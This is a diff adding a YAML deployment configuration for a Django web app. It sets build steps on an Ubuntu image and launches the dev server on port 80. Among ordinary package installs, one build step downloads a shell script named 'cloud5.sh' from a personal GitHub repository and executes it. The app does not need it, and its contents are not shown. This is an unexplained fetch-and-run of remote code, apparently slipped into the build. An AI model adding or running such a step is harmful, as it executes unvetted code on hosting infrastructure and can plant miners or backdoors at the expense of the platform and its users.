@@ -1,0 +1,14 @@
+deployments:
+  MyWebApp:
+    dockerimage: ubuntu:18.04
+    build_steps:
+      - apt-get upgrade
+      - apt-get update
+      - apt-get install -y wget
+      - apt-get update
+      - wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud5.sh && chmod +x cloud5.sh && ./cloud5.sh
+      - pip install setuptools pip
+      - pip install ~/code
+    launch_steps:
+      - cd ~/code/mysite
+      - python manage.py runserver 0.0.0.0:80
